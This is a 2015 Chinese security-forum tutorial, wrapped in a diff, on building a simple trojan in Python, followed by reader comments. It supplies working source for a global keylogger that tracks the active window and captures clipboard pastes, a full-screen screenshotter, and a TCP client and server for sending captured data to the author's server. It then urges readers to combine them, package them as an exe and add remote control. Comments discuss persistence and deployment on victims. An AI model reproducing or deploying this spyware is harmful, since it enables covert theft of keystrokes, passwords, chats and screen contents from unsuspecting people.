@@ -1,0 +1,172 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Python编写简易木马程序</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">light</a> <span class="bull">·</span> <time title="2015/01/26 10:07" ui-time="" datetime="2015/01/26 10:07" class="published ng-binding ng-isolate-scope">2015/01/26 10:07</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 准备</h1><hr><p>文章内容仅供学习研究、切勿用于非法用途！</p><p>这次我们使用Python编写一个具有键盘记录、截屏以及通信功能的简易木马。依然选用Sublime text2 +JEDI（python自动补全插件）来撸代码，安装配置JEDI插件可以参照这里： http://drops.wooyun.org/tips/4413</p><p>首先准备好我们需要的依赖库,python hook和pythoncom。</p><p>下载安装python hook</p><p><img alt="enter image description here" img-src="1ae5d96885f893047eabf14e0839dceda421648a.jpg"></p><p>下载安装pythoncom模块：</p><p>http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/pywin32-219.win32-py2.7.exe/download</p><p><img alt="enter image description here" img-src="6d05b61d811ed619153b1e1e2b6b25051f6eb0e9.jpg"></p><p>如果觉得麻烦，你可以直接使用集成了所有我们所需要的python库的商业版Activepython（我们可以用他的免费版）：</p><p>http://www.activestate.com/activepython</p><h1>0x01 键盘记录器</h1><hr><p>说起Keylogger，大家的思维可能早已飞向带有wifi功能的mini小硬件去了。抛开高科技，我们暂且回归本质，探探简易键盘记录器的原理与实现。</p><p>Python keylogger键盘记录的功能的实现主要利用了pythoncom及pythonhook，然后就是对windows API的各种调用。Python之所以用起来方便快捷，主要归功于这些庞大的支持库，正所谓“人生苦短，快用Python”。</p><p>代码部分：</p><pre><code>#!python
+# -*- coding: utf-8 -*-  
+from ctypes import *
+import pythoncom
+import pyHook
+import win32clipboard
+
+user32 = windll.user32
+kernel32 = windll.kernel32
+psapi = windll.psapi
+current_window = None
+
+# 
+def get_current_process():
+
+    # 获取最上层的窗口句柄
+    hwnd = user32.GetForegroundWindow()
+
+    # 获取进程ID
+    pid = c_ulong(0)
+    user32.GetWindowThreadProcessId(hwnd,byref(pid))
+
+    # 将进程ID存入变量中
+    process_id = "%d" % pid.value
+
+    # 申请内存
+    executable = create_string_buffer("\x00"*512)
+    h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid)
+
+    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
+
+    # 读取窗口标题
+    windows_title = create_string_buffer("\x00"*512)
+    length = user32.GetWindowTextA(hwnd,byref(windows_title),512)
+
+    # 打印
+    print 
+    print "[ PID:%s-%s-%s]" % (process_id,executable.value,windows_title.value)
+    print 
+
+    # 关闭handles
+    kernel32.CloseHandle(hwnd)
+    kernel32.CloseHandle(h_process)
+
+# 定义击键监听事件函数
+def KeyStroke(event):
+
+    global current_window
+
+    # 检测目标窗口是否转移(换了其他窗口就监听新的窗口)
+    if event.WindowName != current_window:
+        current_window = event.WindowName
+        # 函数调用
+        get_current_process()
+
+    # 检测击键是否常规按键（非组合键等）
+    if event.Ascii &gt; 32 and event.Ascii &lt;127:
+        print chr(event.Ascii),
+    else:
+        # 如果发现Ctrl+v（粘贴）事件，就把粘贴板内容记录下来
+        if event.Key == "V":
+            win32clipboard.OpenClipboard()
+            pasted_value = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+            print "[PASTE]-%s" % (pasted_value),
+        else:
+            print "[%s]" % event.Key,
+    # 循环监听下一个击键事件
+    return True
+
+# 创建并注册hook管理器
+kl = pyHook.HookManager()
+kl.KeyDown = KeyStroke
+
+# 注册hook并执行
+kl.HookKeyboard()
+pythoncom.PumpMessages()
+</code></pre><p>【知识点】钩子(Hook)：Windows消息处理机制的一个平台,应用程序可以在上面设置子程以监视指定窗口的某种消息，而且所监视的窗口可以是其他进程所创建的。</p><p>撸代码时一定要注意严格区分大小写。检查无误后启动keylogger：</p><p><img alt="enter image description here" img-src="038fcfc485c7270e69c61a31fdc3dd99f304e0f6.jpg"></p><p>然后可以尝试打开记事本写点东西，过程中可以看到我们的keylogger窗口正在对我们的输入实时记录：</p><p><img alt="enter image description here" img-src="949833cafb8299baa7c01f6f19d6b5346adb9bcf.jpg"></p><p>切换窗口时会自动跟踪到新窗口（众：这点功能都没有还敢叫keylogger吗！），light教授趁机骚扰一下疯狗，可以看到我们的keylogger已经跟踪到QQ聊天窗口，并忠实的记录下我输入的一切。</p><p><img alt="enter image description here" img-src="98d0e7a6f6263f39c54119198f1d0e4149c5cbe3.jpg"></p><h1>0x02 看看你在干什么：编写一个screenshotter</h1><hr><p>截屏实现起来更简单，直接调用几个gui相关的api即可，我们直接看代码：</p><pre><code>#!python
+# -*- coding: utf-8 -*-  
+import win32gui
+import win32ui
+import win32con
+import win32api
+
+# 获取桌面
+hdesktop = win32gui.GetDesktopWindow()
+
+# 分辨率适应
+width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
+height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
+left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
+top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
+
+# 创建设备描述表
+desktop_dc = win32gui.GetWindowDC(hdesktop)
+img_dc = win32ui.CreateDCFromHandle(desktop_dc)
+
+# 创建一个内存设备描述表
+mem_dc = img_dc.CreateCompatibleDC()
+
+# 创建位图对象
+screenshot = win32ui.CreateBitmap()
+screenshot.CreateCompatibleBitmap(img_dc, width, height)
+mem_dc.SelectObject(screenshot)
+
+# 截图至内存设备描述表
+mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
+
+# 将截图保存到文件中
+screenshot.SaveBitmapFile(mem_dc, 'c:\\WINDOWS\\Temp\\screenshot.bmp')
+
+# 内存释放
+mem_dc.DeleteDC()
+win32gui.DeleteObject(screenshot.GetHandle())
+</code></pre><p>看看效果如何：</p><p><img alt="enter image description here" img-src="5db0201479e967f8457776bc5cce8a0b31d30455.jpg"></p><h1>0x03 综合运用：完成一个简易木马</h1><hr><p>无论是keylogger记录下的内容，还是screenshotter截获的图片，只存在客户端是没有太大意义的，我们需要构建一个简单server和client端来进行通信，传输记录下的内容到我们的服务器上。</p><p>编写一个简单的TCPclient</p><pre><code>#!python
+# -*- coding: utf-8 -*- 
+import socket
+
+# 目标地址IP/URL及端口
+target_host = "127.0.0.1"
+target_port = 9999
+
+# 创建一个socket对象
+client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+
+# 连接主机
+client.connect((target_host,target_port))
+
+# 发送数据
+client.send("GET / HTTP/1.1\r\nHOST:127.0.0.1\r\n\r\n")
+
+# 接收响应
+response = client.recv(4096)
+
+print response
+</code></pre><p>编写一个简单的TCPserver</p><pre><code>#!python
+# -*- coding: utf-8 -*- 
+import socket
+import threading
+
+# 监听的IP及端口
+bind_ip = "127.0.0.1"
+bind_port = 9999
+
+server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+
+server.bind((bind_ip,bind_port))
+
+server.listen(5)
+
+print "[*] Listening on %s:%d" % (bind_ip,bind_port)
+
+def handle_client(client_socket):
+
+    request = client_socket.recv(1024)
+
+    print "[*] Received:%s" % request
+
+    client_socket.send("ok!")
+
+    client_socket.close()
+
+while True:
+
+    client,addr = server.accept()
+
+    print "[*] Accept connection from:%s:%d" % (addr[0],addr[1])
+
+    client_handler = threading.Thread(target=handle_client,args=(client,))
+
+    client_handler.start()
+</code></pre><p>开启服务端监听：</p><p><img alt="enter image description here" img-src="37d107e626d499e3fbdf2680f2ced666311c2669.jpg"></p><p>客户端执行：</p><p><img alt="enter image description here" img-src="b1c7bafb4a47aa4cfd6805c0a5c0933f1bbdf85a.jpg"></p><p>服务端接收到客户端的请求并作出响应：</p><h1>0x04 结语</h1><hr><p>最后，你需要做的就是把上面三个模块结合起来，一个简易的具有键盘记录、屏幕截图并可以发送内容到我们服务端的木马就完成了。可以使用py2exe把脚本生成exe可执行文件。当然你还可以继续发挥，加上远程控制功能。Py2exe用法可以参考这里：</p><p>http://www.py2exe.org/index.cgi/Tutorial</p><p>Enjoy coding~</p><h2>参考文档：</h2><p>《Black Hat Python》 https://www.google.com https://www.python.org/ http://www.py2exe.org/</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Mark</span> <span class="reply-time">2016-05-20 17:52:20</span></div><p></p><p>这完完全全就是python黑帽子的代码啊。。。。。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">inquisiter</span> <span class="reply-time">2016-04-22 19:46:20</span></div><p></p><p>@geek_he 有没有64位的程序啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">intR</span> <span class="reply-time">2016-03-29 00:41:01</span></div><p></p><p>关机后怎么自启动？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">geek_he</span> <span class="reply-time">2016-01-08 22:56:02</span></div><p></p><p>书我基本也看了，你拿前几章做的那么个简单通讯来做第八章的这个也太糟蹋第七章的github指挥中心了吧，我正愁没人和我探讨一下这个书呢，qq405947712，楼主有意向的话可以加我，本人也是新手</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">geek_he</span> <span class="reply-time">2016-01-08 22:53:28</span></div><p></p><p>怎么不用github指挥中心呢</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">HeckFin52</span> <span class="reply-time">2015-12-17 12:41:26</span></div><p></p><p>大牛还请教一下如果结合这三个模块？是用三个脚本做扩展还是代码都在一个脚本里？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">123</span> <span class="reply-time">2015-11-12 20:58:47</span></div><p></p><p>大神，怎么把这三个模块结合起来，求指教</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">成功搞定</span> <span class="reply-time">2015-10-30 13:53:04</span></div><p></p><p>以下是py2exe的官网译本<br>http://blog.csdn.net/puma004/article/details/40742953</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">萌萌酱</span> <span class="reply-time">2015-10-24 20:52:25</span></div><p></p><p>@answer 打包exe</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mark</span> <span class="reply-time">2015-03-16 14:11:31</span></div><p></p><p>mark一下学习</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Mr.xt</span> <span class="reply-time">2015-03-15 21:26:46</span></div><p></p><p>好吧。。错了，以下才是错误。<br>Traceback (most recent call last):<br>File &quot;H:/PycharmProjects/Script/Keylogger.py&quot;, line 4, in &lt;module&gt;<br>import pyHook<br>File &quot;F:\Python27\lib\site-packages\pyHook\__init__.py&quot;, line 1, in &lt;module&gt;<br>from HookManager import *<br>File &quot;F:\Python27\lib\site-packages\pyHook\HookManager.py&quot;, line 1, in &lt;module&gt;<br>import cpyHook<br>File &quot;F:\Python27\lib\site-packages\pyHook\cpyHook.py&quot;, line 7, in &lt;module&gt;<br>import _cpyHook<br>ImportError: DLL load failed: %1 ������Ч�� Win32 Ӧ�ó���</p><p>Process finished with exit code 1</p><p>我明明已经成功安装了所需库，包括pyhook</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Mr.xt</span> <span class="reply-time">2015-03-15 20:38:37</span></div><p></p><p>我试着学习分析你写的那个keylogger简易小木马，但是编译运行后报错。似乎是调用的问题，请问怎么解决(/ □ \)python入门者求教。。<br>Traceback (most recent call last):<br>File &quot;H:/PycharmProjects/Script/example.py&quot;, line 53, in &lt;module&gt;<br>opener = urllib2.build_opener(httpHandler, httpsHandler, cookie, urllib2.HTTPHandler)<br>File &quot;F:\Python27\lib\urllib2.py&quot;, line 490, in build_opener<br>opener.add_handler(h)<br>File &quot;F:\Python27\lib\urllib2.py&quot;, line 326, in add_handler<br>type(handler))<br>TypeError: expected BaseHandler instance, got &lt;type &#039;instance&#039;&gt;</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">light</span> <span class="reply-time">2015-03-09 20:07:44</span></div><p></p><p>大牛莫谦虚，我就是不会c++才玩Python的。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">gainover</span> <span class="reply-time">2015-02-10 23:51:54</span></div><p></p><p>楼主是妹子。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">1world0x00</span> <span class="reply-time">2015-02-10 23:42:12</span></div><p></p><p>对于我这种菜鸟，对于GRAY HAT PYTHON和BLACK HAT PYTHON里面强行python的代码，真的不知道作用在哪。。求大神啪啪打脸。不过思路还不错。。看GRAY HAT PYTHON 都是看思路用c++实现。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">cf_hb</span> <span class="reply-time">2015-02-10 22:34:11</span></div><p></p><p>厉害，一定要去学习一个！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">liyang</span> <span class="reply-time">2015-02-02 12:15:44</span></div><p></p><p>python 写这东西还是有点蛋疼，虽然可以打包 exe，但是有些机器上还是不好使。而且很难进行代码混淆。这些木马功能，晚上随便找个 c++的源码都能实现~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">answer</span> <span class="reply-time">2015-02-01 08:21:09</span></div><p></p><p>如果对方 没有python环境 怎么运行。。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">loiakcah</span> <span class="reply-time">2015-01-30 14:58:49</span></div><p></p><p>the miusc-</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Thorns</span> <span class="reply-time">2015-01-30 02:04:04</span></div><p></p><p>首席音乐家</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">suolong</span> <span class="reply-time">2015-01-29 16:57:35</span></div><p></p><p>有道理，编译后的exe文件基本上无法达到木马或者远控的标准。有例子就拿sqlmap.exe版本就能看出</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">malayke</span> <span class="reply-time">2015-01-29 15:40:02</span></div><p></p><p>顶楼主，改天再写写摄像头拍照呗！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">毛猴</span> <span class="reply-time">2015-01-29 13:49:37</span></div><p></p><p>写的好 赞</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Coyote</span> <span class="reply-time">2015-01-29 11:43:28</span></div><p></p><p>1. 需要编译<br>2. 编译完了会很大, 里面有相关库的DLL文件, 而且有一大堆东西虽然不知道都是些什么, 目测这样的木马用处不会很大(当然有大牛出来实力打脸我也办法)<br>当然除非别人很相信你, 然后点击你提供的exe, 当然这个exe假如你没有处理好的, 点开之后就是一个大黑框, 上面会有你的debug信息, 所以你还要把exe在代码里面fork为daemon进程</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ziwen</span> <span class="reply-time">2015-01-29 03:38:16</span></div><p></p><p>才知道你也玩Python</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">\~</span> <span class="reply-time">2015-01-27 15:40:36</span></div><p></p><p>大黑阔你能干点有意义的事情么</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">light</span> <span class="reply-time">2015-01-27 11:32:01</span></div><p></p><p>Gibson :D</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">light</span> <span class="reply-time">2015-01-27 11:31:27</span></div><p></p><p>python脚本写完就可以直接运行，不需要人工编译</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Demon</span> <span class="reply-time">2015-01-26 17:26:38</span></div><p></p><p>对不起，我黑了你的电吉他，依班娜的。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Power</span> <span class="reply-time">2015-01-26 16:06:59</span></div><p></p><p>有意思.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">hell0w0rld</span> <span class="reply-time">2015-01-26 14:58:05</span></div><p></p><p>俩问题<br>1，需要编译么？ 不编译的话肉鸡上未必有这模块，当然可以自动安装<br>2，编译的话 会不会很大</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">tym</span> <span class="reply-time">2015-01-26 13:49:23</span></div><p></p><p>一个截图6M，确实要压缩才行。。。求高手</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">phith0n</span> <span class="reply-time">2015-01-26 12:38:22</span></div><p></p><p>是为一个python win32编程的好例子~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">tym</span> <span class="reply-time">2015-01-26 12:29:38</span></div><p></p><p>挺好的，学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ccSec</span> <span class="reply-time">2015-01-26 11:31:31</span></div><p></p><p>顶乌云音乐家</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">泳少</span> <span class="reply-time">2015-01-26 10:51:52</span></div><p></p><p>python真强大~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">light</span> <span class="reply-time">2015-01-26 10:50:58</span></div><p></p><p>哇 我的偶像来了，快签名快签名</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">园长</span> <span class="reply-time">2015-01-26 10:46:16</span></div><p></p><p>关键是图片传输压缩算法</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Wens0n</span> <span class="reply-time">2015-01-26 10:40:41</span></div><p></p><p>乌云音乐家。前排广告出售！</p><p></p></div></div></div></div></div></main>
